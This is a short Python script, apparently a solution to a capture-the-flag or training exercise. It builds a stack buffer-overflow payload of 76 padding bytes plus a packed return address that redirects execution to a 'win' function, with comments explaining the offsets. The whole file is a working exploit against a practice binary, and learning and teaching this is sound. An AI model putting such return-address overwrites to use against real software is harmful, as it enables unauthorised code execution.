import struct

# compiler allocates extra 8 bytes for unknown reasons
# compiler pushes %ebp (4 bytes) register onto the stack at the start of any function
padding = "A" * 64 + "A" * 12

# Addresss of the win function
# You can find the address of a function or variable by analyzing the output of 'objdump -t'
addr = 0x080483f4

# Value that will be written to return address
ret_addr = struct.pack("I", addr)

# there will be a segmentation fault after the code redirection
# this is because the return address is garbage value for win function call frame
print(padding + ret_addr)
